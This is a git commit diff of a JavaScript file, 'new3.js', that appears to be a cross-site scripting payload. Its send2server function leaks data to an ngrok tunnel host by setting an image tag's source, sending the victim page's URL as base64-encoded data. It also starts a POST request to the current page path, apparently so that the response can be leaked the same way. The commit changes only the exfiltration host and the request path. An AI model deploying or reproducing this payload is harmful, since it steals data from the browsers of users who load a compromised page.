b0d21ee03593a648a74939f58ad56384e55e9d29
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-20 08:44:28 +0530

    Update new3.js

--- new3.js
+++ new3.js
@@ -1,13 +1,13 @@
 function send2server(name, data){
     img = document.createElement("img");
-    img.src = "https://7b1440ce.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
+    img.src = "https://392445a8.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
     document.getElementById("chat-div").appendChild(img);
 }
 
 send2server("url", window.location.href);
 
 let xhr = new XMLHttpRequest();
-xhr.open("POST", window.location.pathname, true);
+xhr.open("POST", window.location.pathname.slice(1,), true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 xhr.onload = function() { 
